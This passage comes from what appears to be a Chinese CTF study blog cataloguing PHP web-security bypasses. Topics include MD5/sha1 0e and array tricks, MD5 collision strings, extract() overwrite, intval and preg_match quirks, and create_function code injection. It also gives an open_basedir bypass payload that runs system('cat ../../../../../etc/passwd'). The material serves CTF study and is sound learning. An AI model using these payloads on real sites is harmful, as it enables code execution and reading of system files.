($md5==md5($md5))</code><br>可以找0e开头并且md5后仍然0e开头的字符串，这样0==0,就可以绕过了。<br>这里可以用0e215962017。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 0e215962017</span></span><br><span class="line"><span class="keyword">import</span> hashlibfor </span><br><span class="line">i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>**<span class="number">41</span>):   </span><br><span class="line">    i=<span class="string">&#x27;0e&#x27;</span>+<span class="built_in">str</span>(i)   </span><br><span class="line">    md5=hashlib.md5(i.encode()).hexdigest() </span><br><span class="line">    <span class="keyword">if</span> md5[:<span class="number">2</span>]==<span class="string">&#x27;0e&#x27;</span> <span class="keyword">and</span> md5[<span class="number">2</span>:].isdigit():     </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;md5:&#123;&#125; &#x27;</span>.<span class="built_in">format</span>(i))      </span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h5 id="强比较bypass"><a href="#强比较bypass" class="headerlink" title="强比较bypass"></a>强比较bypass</h5><p>md5强比较形式：<br><code>if($_POST[&#39;param1&#39;]!==$_POST[&#39;param2&#39;]&amp;&amp;md5($_POST[&#39;param1&#39;])===md5($_POST[&#39;param2&#39;]))</code><br>0e绕过不能用了，因为强比较时，0exxx不再被当做科学计数法，而是被当做字符串。<br>数组绕过仍然可以。</p><ul><li><p>数组绕过</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eg：(md5($id) === md5($gg) &amp;&amp; $id !== $gg)直接数组绕过：?id[]=1&amp;gg[]=2</span><br></pre></td></tr></table></figure></li><li><p>还有最近碰到的：</p><p>md5强碰撞：<a href="https://blog.csdn.net/EC_Carrot/article/details/109525162">md5强碰撞</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a1&#x27;</span>]!==(<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a1&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a2&#x27;</span>])&#125;</span><br><span class="line"><span class="comment"># 最后转换为字符串比较，因此使用数组就不可行了</span></span><br><span class="line">(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]))===<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))</span><br><span class="line"><span class="comment"># implode()会先把数组元素拼接成字符串再进行md5加密，使用数组就不可行了</span></span><br></pre></td></tr></table></figure><p>只能使用两组MD5值相同的不同字符串了，这里可以用脚本跑， 下面是url编码过后的值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1</span></span><br><span class="line">a=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">00</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1U%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2b=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">02</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1%D5%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line">a=%<span class="number">4</span>d%c9%<span class="number">68</span>%ff%<span class="number">0</span>e%e3%<span class="number">5</span>c%<span class="number">20</span>%<span class="number">95</span>%<span class="number">72</span>%d4%<span class="number">77</span>%<span class="number">7</span>b%<span class="number">72</span>%<span class="number">15</span>%<span class="number">87</span>%d3%<span class="number">6</span>f%a7%b2%<span class="number">1</span>b%dc%<span class="number">56</span>%b7%<span class="number">4</span>a%<span class="number">3</span>d%c0%<span class="number">78</span>%<span class="number">3</span>e%<span class="number">7</span>b%<span class="number">95</span>%<span class="number">18</span>%af%bf%a2%<span class="number">00</span>%a8%<span class="number">28</span>%<span class="number">4</span>b%f3%<span class="number">6</span>e%<span class="number">8</span>e%<span class="number">4</span>b%<span class="number">55</span>%b3%<span class="number">5</span>f%<span class="number">42</span>%<span class="number">75</span>%<span class="number">93</span>%d8%<span class="number">49</span>%<span class="number">67</span>%<span class="number">6</span>d%a0%d1%<span class="number">55</span>%<span class="number">5</span>d%<span class="number">83</span>%<span class="number">60</span>%fb%<span class="number">5</span>f%<span class="number">07</span>%fe%a2&amp;b=%<span class="number">4</span>d%c9%<span class="number">68</span>%ff%<span class="number">0</span>e%e3%<span class="number">5</span>c%<span class="number">20</span>%<span class="number">95</span>%<span class="number">72</span>%d4%<span class="number">77</span>%<span class="number">7</span>b%<span class="number">72</span>%<span class="number">15</span>%<span class="number">87</span>%d3%<span class="number">6</span>f%a7%b2%<span class="number">1</span>b%dc%<span class="number">56</span>%b7%<span class="number">4</span>a%<span class="number">3</span>d%c0%<span class="number">78</span>%<span class="number">3</span>e%<span class="number">7</span>b%<span class="number">95</span>%<span class="number">18</span>%af%bf%a2%<span class="number">02</span>%a8%<span class="number">28</span>%<span class="number">4</span>b%f3%<span class="number">6</span>e%<span class="number">8</span>e%<span class="number">4</span>b%<span class="number">55</span>%b3%<span class="number">5</span>f%<span class="number">42</span>%<span class="number">75</span>%<span class="number">93</span>%d8%<span class="number">49</span>%<span class="number">67</span>%<span class="number">6</span>d%a0%d1%d5%<span class="number">5</span>d%<span class="number">83</span>%<span class="number">60</span>%fb%<span class="number">5</span>f%<span class="number">07</span>%fe%a2</span><br></pre></td></tr></table></figure></li></ul><h4 id="substr-、sha1-、base64-decode"><a href="#substr-、sha1-、base64-decode" class="headerlink" title="substr()、sha1()、base64_decode"></a>substr()、sha1()、base64_decode</h4><p><code>substr()</code>、<code>sha1()</code>、<code>base64_decode()</code>只能处理传入的字符串数据 当传入数组后会报出Warning错误，但仍会正常运行并返回值，当==左右两边都错误时，并且正常运行返回相同的值，就可以是判定条件成立</p><p>bypass：对<code>substr()</code>、<code>sha1()</code>、<code>base64_decode()</code>传入数组则返回null</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=[];<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$a</span>, <span class="number">123</span>));        <span class="comment">//NULL</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$a</span>));                     <span class="comment">//NULL</span></span><br><span class="line"><span class="comment"># sha1后为0e数字的值：aaroZmOk aaO8zKZF aaK1STfY</span></span><br><span class="line"><span class="comment"># aaK1STfY  0e76658526655756207688271159624026011393</span></span><br><span class="line"><span class="comment"># aaO8zKZF  0e89257456677279068558073954252716165668</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$a</span>, <span class="number">123</span>) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$cc</span>));    <span class="comment">//bool(true)</span></span><br></pre></td></tr></table></figure><h4 id="extract-变量覆盖"><a href="#extract-变量覆盖" class="headerlink" title="extract()变量覆盖"></a>extract()变量覆盖</h4><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$auth</span>=<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$auth</span>==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag&#123;xxxxxxxxx&#125;!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;nonono!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>extract() 函数</p><p>从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。该函数返回成功设置的变量数目。为了拿到flag，需要auth值为1，此处我们利用extract()变量覆盖的缺陷，将auth覆盖为1。</p><h4 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h4><p>获取变量的整数值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intval ( mixed $value , int $base = 10 ) : int</span><br></pre></td></tr></table></figure><p>value：要转换的数量值，base：转换所用进制</p><p>三个特性：</p><ul><li><p>成功：返回var的整数值； 失败 or 空数组：返回0； 非空数组：返回1</p></li><li><p>如果 <code>base</code> 是 0，通过检测 <code>value</code> 的格式来决定使用的进制：</p><ul><li>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，</li><li>如果字符串以 “0” 开始，使用 8 进制(octal)；否则，</li><li>将使用 10 进制 (decimal)。</li></ul></li><li><p>base为0，变量在遇上数字或正负符号才做转换，遇到非数字或字符串结束时以(\0)结束转换，ps：前提是进行弱类型比较</p><blockquote><p>默认遇到<code>非数字字符</code>就会停止识别 如：<code>intval($_GET[1])</code>传入1=666aa；intval得到结果为666</p><p> Intval在处理字符串型的科学计数法时只输出e前的数字，而+1后又作为数字处理</p><p>echo intval(1e10); -&gt;10000000000</p><p>echo intval(“1e10”); -&gt;1</p><p>echo intval(“1e10”+1); -&gt;10000000001</p></blockquote></li></ul><h4 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric()"></a>is_numeric()</h4><p><strong>is_numeric()</strong> ：判断变量是否为数字或数字字符串，不仅检查10进制，16进制也可以。</p><p>is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断因此输入%20password在解析变量名就会变成password</p><p><strong>bypass</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd=<span class="number">1234567</span>%<span class="number">20</span>passwd=<span class="number">1234567</span>%<span class="number">00</span></span><br></pre></td></tr></table></figure><p>此外：在某些cms中，会利用如下代码检测用户输入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 该片段判断参数s是否为数字，是则带入数据库查询，不是则返回0</span></span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>]:<span class="number">0</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;insert into test(type)values(<span class="subst">$s</span>);&quot;</span>;  </span><br><span class="line"><span class="comment">//是 values($s) 不是values(&#x27;$s&#x27;)</span></span><br><span class="line"><span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure><p>但可以将sql语句转换为16进制传给参数</p><p><a href="https://i.loli.net/2021/03/10/yamFEb2WUMnvKi1.jpg"><img src="https://i.loli.net/2021/03/10/yamFEb2WUMnvKi1.jpg" alt="img"></a></p><h4 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> <span class="title function_ invoke__">in_array</span> ( <span class="keyword">mixed</span> <span class="variable">$needle</span> , <span class="keyword">array</span> <span class="variable">$haystack</span> [, <span class="keyword">bool</span> <span class="variable">$strict</span> = <span class="literal">FALSE</span> ] )</span><br></pre></td></tr></table></figure><p>ps：strict相当于是否开启强比较</p><ul><li>不提供strict参数 (即默认为<code>false</code>)时，会进行<code>松散比较</code>，判断needle是否在数组haystack中</li><li>strict=<code>true</code>；还会比较needle和haystack中<code>元素类型是否相同</code></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$array</span>=[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;3&#x27;</span>];<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">in_array</span>(<span class="string">&#x27;abc&#x27;</span>, <span class="variable">$array</span>));  <span class="comment">//true   </span></span><br><span class="line"><span class="comment"># &#x27;abc&#x27;转换为0</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">in_array</span>(<span class="string">&#x27;1bc&#x27;</span>, <span class="variable">$array</span>));  <span class="comment">//true  </span></span><br><span class="line"><span class="comment"># &#x27;1bc&#x27;转换为1</span></span><br><span class="line"><span class="comment"># 转换整型int/浮点型float会返回元素个数；</span></span><br><span class="line"><span class="comment"># 转换bool返回Array中是否有元素；</span></span><br><span class="line"><span class="comment"># 转换成string返回&#x27;Array&#x27;，并抛出warning</span></span><br></pre></td></tr></table></figure><p><strong>array_search()和in_array()类似</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">array</span>(<span class="number">1</span>,<span class="number">4</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">array_search</span>(<span class="string">&quot;4admin&quot;</span>,<span class="variable">$a</span>)); <span class="comment">// int(0)=&gt; 返回键值1</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">array_search</span>(<span class="string">&quot;1admin&quot;</span>,<span class="variable">$a</span>)); <span class="comment">// int(1) ==&gt;返回键值0</span></span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">//这个和之前的类型转换类似，但是如果是array_search(“4admin”,$a,true),最后的“true”会禁止类型转换。</span></span><br></pre></td></tr></table></figure><h4 id="json"><a href="#json" class="headerlink" title="json()"></a>json()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>]);</span><br><span class="line">    <span class="variable">$key</span> =<span class="string">&quot;*********&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$message</span>-&gt;key == <span class="variable">$key</span> ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;fail&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;~~~~&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输入一个json类型的字符串，json_decode函数解密成一个数组，判断数组中key的值是否等于<br><code>$key</code>的值，但是<code>$key</code>的值我们不知道</p><p>这时我们构造一个和任意字符串返回为真的数组{“key”:true}。即可绕过</p><p>payload=message={“key”,true}</p><h4 id="ereg"><a href="#ereg" class="headerlink" title="ereg()"></a>ereg()</h4><p>正则表达式匹配，在php7.0.0版本后被去除</p><p>存在NULL截断漏洞，可以使用%00截断来绕过正则匹配~</p><blockquote><p>像ctfshow web108</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(ereg(&quot;^[a-zA-Z]+$&quot;, $_GET[&#x27;c&#x27;])===FALSE))</span><br></pre></td></tr></table></figure><p>就可以用 <code>a%00</code>来绕过，在%00后就可以任意传入了</p></blockquote><h4 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a>preg_match()</h4><ol><li>preg_match只能处理字符串，当传入数组时会返回false</li><li><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a></li><li><code>.</code>不会匹配换行符； eg:<code>preg_match(&#39;/^.*(flag).*$/&#39;, $a)</code>可令<code>a=&quot;\nflag&quot;</code> 而非多行模式下，<code>$</code>会忽略末尾的<code>%0a</code>即空字符； eg:<code>preg_match(&#39;/^flag$/&#39;, $_GET[&#39;a&#39;]) &amp;&amp; $_GET[&#39;a&#39;] !== &#39;flag&#39;</code>可输入<code>a=flag%0a</code></li></ol><h4 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h4><blockquote><p><a href="https://www.php.net/manual/zh/function.eval">PHP: eval - Manual</a> eval — 把字符串作为PHP代码执行：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(string `$code`): [mixed]</span><br></pre></td></tr></table></figure><p>code为要执行的字符串，传入的代码不能包含打开/关闭PHP tags；且要以分号结尾</p><p>（实际可以把eval($code)的效果看成将$code这部分直接插入到php代码里~）</p><blockquote><p>eval是语言构造器而不是一个函数，不能被可变函数调用</p><p>可变函数即变量名加括号，PHP系统会尝试解析成函数，如果有当前变量中的值为命名的函数，就会调用。如果没有就报错。 · 可变函数不能用于例如 echo，print，unset()，isset()，empty()，include，require eval() 以及类似的语言结构。需要使用自己的包装函数来将这些结构用作可变函数</p></blockquote></blockquote><h4 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h4><blockquote><p><a href="https://www.php.net/manual/zh/function.assert">PHP: assert - Manual</a></p><p>assert把整个字符串当作php代码执行，而eval是把合法的php代码执行</p><p>在PHP7.1版本以后， assert()默认不再可以执行代码 (assert在更新后无法将使用字符串作为参数，而GET或POST传入的数据默认就是字符串类型）</p></blockquote><h4 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h4><p>preg_replace() /e模式下可以执行代码：<a href="https://xz.aliyun.com/t/2557">深入研究preg_replace与代码执行</a></p><blockquote><p>preg_replace — 执行一个正则表达式的搜索和替换(PHP 4, PHP 5, PHP 7)</p><p>搜索<code>subject</code>中匹配<code>pattern</code>的部分， 以<code>replacement</code>进行替换。</p><p>第一个参数<code>$pattern</code>：搜索的模式，可以是一个字符串或者字符串数组，可以加<code>\e</code>修正符。</p><p>第二个参数<code>$replacement</code>：要替换的字符。</p><p>第三个参数<code>$subject</code>：需要被处理的字符串。</p><p>问题出在第一个参数的<code>\e</code>修正符上。当加上了<code>\e</code>修正符号时，<code>$replacement</code>会被当做php代码片段执行。这个环境需要在<code>php5.4</code>下。<code>php7.0</code>完全放弃了该函数，<code>php5.5的后续版本</code>会爆出提示，要求<code>preg_replace_callback()</code>来代替该函数。</p></blockquote><h4 id="creat-function"><a href="#creat-function" class="headerlink" title="creat_function()"></a>creat_function()</h4><p>代码注入 <a href="https://paper.seebug.org/94/">解析create_function()(seebug.org)</a></p><blockquote><p>创建匿名函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$name&#x27;</span>,<span class="string">&#x27;echo $name.&quot;a&quot;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>就类似于</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;  <span class="keyword">echo</span> <span class="variable">$name</span>.<span class="string">&quot;a&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>那么传入<code>a=;&#125;phpinfo();/*</code>就会得到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;  <span class="keyword">echo</span> <span class="variable">$name</span>;&#125;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">/*;&#125;</span></span><br></pre></td></tr></table></figure><p>;}将前面的语句和函数闭合，/*把后面的;}注释掉，phpinfo()；就成功执行了</p></blockquote><h4 id="curl"><a href="#curl" class="headerlink" title="curl()"></a>curl()</h4><p><a href="https://www.jianshu.com/p/7fab00c11770">php curl实现发送get和post请求 - 简书 (jianshu.com)</a></p><p><a href="https://www.shuzhiduo.com/A/l1dygVWqJe/">网鼎杯-Fakebook-反序列化和SSRF和file协议读取文件 (shuzhiduo.com)</a></p><h4 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a>strcmp()</h4><p><code>strcmp(str1,str2)</code>：比较两个字符串str1和str2</p><ul><li>str1&lt;str2 返回&lt;0</li><li>str1&gt;str2返回&gt;0</li><li>str1=str2 返回0</li></ul><p>ps：数据类型不匹配(即传入非字符串类型)，也会返回0 （仅php&lt;5.3）</p><p>bypass：同样的，给strcmp的参数为数组也会返回null</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 传入 passwd[]=xxx</span><br><span class="line">实际是因为函数接受到了不符合的类型，将发生错误，但是还是判断其相等（某种意义上null相当于false）</span><br></pre></td></tr></table></figure><h4 id="open-basedir-绕过"><a href="#open-basedir-绕过" class="headerlink" title="open_basedir()绕过"></a>open_basedir()绕过</h4><h5 id="chdir-、ini-set-函数组合"><a href="#chdir-、ini-set-函数组合" class="headerlink" title="chdir()、ini_set()函数组合"></a>chdir()、ini_set()函数组合</h5><p>利用ini_set()设置php.ini的值，在函数执行时生效，脚本结束后恢复原状。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">ini_set</span> ( <span class="keyword">string</span> <span class="variable">$varname</span> , <span class="keyword">string</span> <span class="variable">$newvalue</span> ) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure><p>varname是需要设置的值；newvalue是设置成为新的值 成功时返回旧的值，失败时返回 FALSE</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);<span class="title function_ invoke__">system</span>(‘cat ../../../../../etc/passwd’);</span><br></pre></td></tr></table></figure><h4 id="glob"><a href="#glob" class="headerlink" title="glob:/"></a>glob:/</h4><p>glob://协议是php5.3.0以后一种查找匹配的文件路径模式，而单纯传参glob://是没办法列目录的，需要结合其他函数方法</p><p><strong>scandir()+glob://</strong></p><p>只能列出根目录以及open_basedir()允许目录下的文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;glob:///*&#x27;</span>));</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p><strong>DirectoryIterator+glob://</strong></p><p>DirectoryIterator是php5中增加的一个类，为用户提供一个简单的查看目录的接口，利用此方法可以绕过open_basedir限制。(但是似乎只能用于Linux下)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payloadL:</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*.txt&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#   glob:///*   会列出根目录下的文件</span></span><br><span class="line"><span class="comment">#   glob://*    会列出open_basedir允许目录下的文件</span></span><br></pre></td></tr></table></figure><p><strong>opendir()+readdir()+glob://</strong></p><p>同样只能列出根目录已经open_basedir()允许的目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="variable">$b</span> = <span class="title function_ invoke__">opendir</span>(<span class="string">&#x27;glob:///*&#x27;</span>) ) &#123;</span><br><span class="line">    <span class="keyword">while</span> ( (<span class="variable">$file</span> = <span class="title function_ invoke__">readdir</span>(<span class="variable">$b</span>)) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">closedir</span>(<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="一些特性"><a href="#一些特性" class="headerlink" title="一些特性"></a>一些特性</h2><h3 id="PHP处理上传文件"><a href="#PHP处理上传文件" class="headerlink" title="PHP处理上传文件"></a>PHP处理上传文件</h3><p>php在处理上传文件时，会将上传文件放在临时文件夹</p><p>命名格式为：<code>/tmp/php??????</code>（windows下则有[<code>.tmp</code>]后缀） <code>php[0-9A-Za-z]&#123;3,4,5,6&#125;</code>默认为php+4/6位随机数字和大小写字母</p><h3 id="php短标签"><a href="#php短标签" class="headerlink" title="php短标签"></a>php短标签</h3><p><code>&lt;?=</code> 是 <code>&lt;?php echo</code> 